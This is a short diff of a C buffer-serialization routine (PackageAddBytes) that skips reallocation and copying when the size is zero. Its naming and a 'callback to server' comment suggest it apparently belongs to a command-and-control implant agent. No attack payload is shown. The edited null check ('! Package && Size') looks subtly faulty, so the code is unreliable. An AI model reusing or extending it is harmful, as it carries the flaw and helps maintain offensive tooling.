@@ -97,23 +97,26 @@ VOID PackageAddPad( PPACKAGE Package, PUCHAR Data, SIZE_T Size )
 
 VOID PackageAddBytes( PPACKAGE Package, PUCHAR Data, SIZE_T Size )
 {
-    if ( ! Package )
+    if ( ! Package && Size )
         return;
 
     PackageAddInt32( Package, Size );
 
-    Package->Buffer = Instance.Win32.LocalReAlloc(
-            Package->Buffer,
-            Package->Length + Size,
-            LMEM_MOVEABLE | LMEM_ZEROINIT
-    );
+    if ( Size )
+    {
+        Package->Buffer = Instance.Win32.LocalReAlloc(
+                Package->Buffer,
+                Package->Length + Size,
+                LMEM_MOVEABLE | LMEM_ZEROINIT
+        );
 
-    Int32ToBuffer( Package->Buffer + ( Package->Length - sizeof( UINT32 ) ), Size );
+        Int32ToBuffer( Package->Buffer + ( Package->Length - sizeof( UINT32 ) ), Size );
 
-    MemCopy( Package->Buffer + Package->Length, Data, Size );
+        MemCopy( Package->Buffer + Package->Length, Data, Size );
 
-    Package->Size   =   Package->Length;
-    Package->Length +=  Size;
+        Package->Size   =   Package->Length;
+        Package->Length +=  Size;
+    }
 }
 
 // For callback to server
